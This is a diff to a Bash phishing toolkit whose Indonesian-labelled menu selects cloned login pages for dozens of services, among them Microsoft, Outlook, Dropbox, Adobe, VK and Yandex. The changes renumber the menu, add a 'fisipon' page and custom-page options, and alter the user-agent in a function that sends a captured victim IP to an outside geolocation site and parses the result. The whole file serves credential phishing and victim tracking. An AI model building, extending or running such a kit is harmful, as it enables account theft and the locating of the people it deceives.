@@ -47,7 +47,7 @@ printf "                                        \e[0;33m▬▬▬▬▬▬▬▬
 \e[0m[\e[1;2;96m15\e[0m] \e[1;77mWordpress \e[0m     \e[0m[\e[1;2;96m34\e[0m] \e[1;77mdevianART\e[0m      \e[0m[\e[1;94m#\e[0m] Informasi\e[0m
 \e[0m[\e[1;2;96m16\e[0m] \e[1;77mMicrosoft \e[0m     \e[0m[\e[1;2;96m35\e[0m] \e[1;77mWattpad  \e[0m      \e[0m[\e[1;92m*\e[0m] Perbarui\e[0m
 \e[0m[\e[1;2;96m17\e[0m] \e[1;77mFollowers \e[0m     \e[0m[\e[1;2;96m36\e[0m] \e[1;77mGame     \e[0m      \e[0m[\e[1;91m-\e[0m] Keluar\e[0m
-\e[0m[\e[1;2;96m18\e[0m] \e[1;77mPispon    \e[0m     \e[0m[\e[1;2;96m37\e[0m] \e[1;77mCustom   \e[0m
+\e[0m[\e[1;2;96m18\e[0m] \e[1;77mFisipon   \e[0m     \e[0m[\e[1;2;96m37\e[0m] \e[1;77mCustom   \e[0m
 \e[0m[\e[1;2;96m19\e[0m] \e[1;77mOutlook   \e[0m     \e[0m[\e[1;2;96m38\e[0m] \e[1;77mOthers   \e[0m      "
 }
 menu(){
@@ -97,70 +97,78 @@ menu(){
                         elif [[ $option == 15 ]]; then
                         server="wordpress"
                         start
-                        elif [[ $option == 16 ]]; then
-                        server="microsoft"
-                        start
-                    elif [[ $option == 17 ]]; then
-                    server="instafollowers"
+                    elif [[ $option == 16 ]]; then
+                    server="microsoft"
                     start
-                elif [[ $option == 18 ]]; then
-                server="outlook"
+                elif [[ $option == 17 ]]; then
+                server="instafollowers"
                 start
-            elif [[ $option == 19 ]]; then
-            server="pinterest"
+            elif [[ $option == 18 ]]; then
+            server="fisipon"
             start
-        elif [[ $option == 20 ]]; then
+        elif [[ $option == 19 ]]; then
+        server="outlook"
+        start
+    elif [[ $option == 20 ]]; then
+    server="pinterest"
+    start
+        elif [[ $option == 21 ]]; then
         server="shopping"
         start
-    elif [[ $option == 21 ]]; then
-    server="cryptocurrency"
-    start
-        elif [[ $option == 22 ]]; then
-        server="verizon"
-        start
-            elif [[ $option == 23 ]]; then
-            server="dropbox"
+            elif [[ $option == 22 ]]; then
+            server="cryptocurrency"
             start
-                elif [[ $option == 24 ]]; then
-                server="adobe"
+                elif [[ $option == 23 ]]; then
+                server="verizon"
                 start
-                    elif [[ $option == 25 ]]; then
+                    elif [[ $option == 24 ]]; then
+                    server="dropbox"
+                    start
+                        elif [[ $option == 25 ]]; then
+                        server="adobe"
+                        start
+                    elif [[ $option == 26 ]]; then
                     server="shopify"
                     start
-                        elif [[ $option == 26 ]]; then
-                        server="messenger"
-                        start
-                    elif [[ $option == 27 ]]; then
-                    server="gitlab"
-                    start
-                elif [[ $option == 28 ]]; then
-                server="twitch"
+                elif [[ $option == 27 ]]; then
+                server="messenger"
                 start
-            elif [[ $option == 29 ]]; then
-            server="myspace"
+            elif [[ $option == 28 ]]; then
+            server="gitlab"
             start
-        elif [[ $option == 39 ]]; then
+        elif [[ $option == 29 ]]; then
+        server="twitch"
+        start
+    elif [[ $option == 30 ]]; then
+    server="myspace"
+    start
+        elif [[ $option == 31 ]]; then
         server="badoo"
         start
-    elif [[ $option == 31 ]]; then
-    server="vk"
-    start
-        elif [[ $option == 32 ]]; then
-        server="yandex"
-        start
-            elif [[ $option == 33 ]]; then
-            server="devianart"
+            elif [[ $option == 32 ]]; then
+            server="vk"
             start
-                elif [[ $option == 34 ]]; then
-                server="wattpad"
+                elif [[ $option == 33 ]]; then
+                server="yandex"
                 start
-                    elif [[ $option == 35 ]]; then
-                    server="game"
+                    elif [[ $option == 34 ]]; then
+                    server="devianart"
                     start
-                        elif [[ $option == 36 ]]; then
-                        server="create"
-                        createpage
+                        elif [[ $option == 35 ]]; then
+                        server="wattpad"
                         start
+                    elif [[ $option == 36 ]]; then
+                    server="game"
+                    createpage
+                    start
+                elif [[ $option == 37 ]]; then
+                server="create"
+                createpage
+                start
+            elif [[ $option == 38 ]]; then
+            server="other"
+            createpage
+            start
         elif [[ $option == '&' ]]; then
         echo
         nano LICENSE
@@ -300,7 +308,7 @@ catch_ip(){
             rm -rf iptracker.log
         fi
 IFS='\n'
-iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
+iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36" > iptracker.log)
 IFS=$'\n'
 continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
     printf "\n"
